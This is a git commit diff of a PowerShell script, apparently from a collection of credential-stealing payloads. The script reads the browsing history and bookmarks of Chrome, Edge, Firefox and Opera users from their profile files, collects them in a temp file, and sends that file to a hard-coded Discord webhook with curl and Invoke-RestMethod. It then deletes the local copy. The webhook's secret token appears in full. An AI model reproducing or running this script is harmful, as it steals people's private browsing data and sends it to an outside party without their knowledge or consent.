0516d711ab7e4d90f6c78aa8b940a4b9005fd44e
zenin0 <isaacsanzgomez102125@gmail.com>
2023-10-23 18:19:17 +0200

    Update

--- Windows/Credentials/BrowserData/browserData.ps1
+++ Windows/Credentials/BrowserData/browserData.ps1
@@ -1,32 +1,57 @@
+function Upload-Discord {
+
+    [CmdletBinding()]
+    param (
+        [parameter(Position = 0, Mandatory = $False)]
+        [string]$file,
+        [parameter(Position = 1, Mandatory = $False)]
+        [string]$text 
+    )
+    
+    $hookurl = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
+    
+    
+    $Body = @{
+        'username' = $env:username
+        'content'  = $text
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    };
+    
+    if (-not ([string]::IsNullOrEmpty($file))) { curl.exe -F "file1=@$file" $hookurl }
+}
+
 function Get-BrowserData {
 
     [CmdletBinding()]
     param (	
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$Browser,    
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$DataType 
+        [Parameter (Position = 1, Mandatory = $True)]
+        [string]$Browser,    
+        [Parameter (Position = 1, Mandatory = $True)]
+        [string]$DataType 
     ) 
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+    if ($Browser -eq 'chrome' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks' ) { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks' ) { $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" }
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
+    elseif ($Browser -eq 'opera' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
+    elseif ($Browser -eq 'opera' -and $DataType -eq 'history'   ) { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }
 
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % { ($_.Matches).Value } | Sort -Unique
     $Value | ForEach-Object {
         $Key = $_
-        if ($Key -match $Search){
+        if ($Key -match $Search) {
             New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
+                User     = $env:UserName
+                Browser  = $Browser
                 DataType = $DataType
-                Data = $_
+                Data     = $_
             }
         }
     } 
@@ -47,33 +72,6 @@ Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.t
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
 Upload-Discord -file $env:TMP\--BrowserData.txt
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "https://discord.com/api/webhooks/1164596165849927792/7ASILUXC1ya92O9OsNFDXhVS_MBFOkTZWlBLVaTtzVwXeO8jz1_IGi5w82goz88vProJ"
-
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
 
 ############################################################################################################################################################
 RI $env:TEMP/--BrowserData.txt
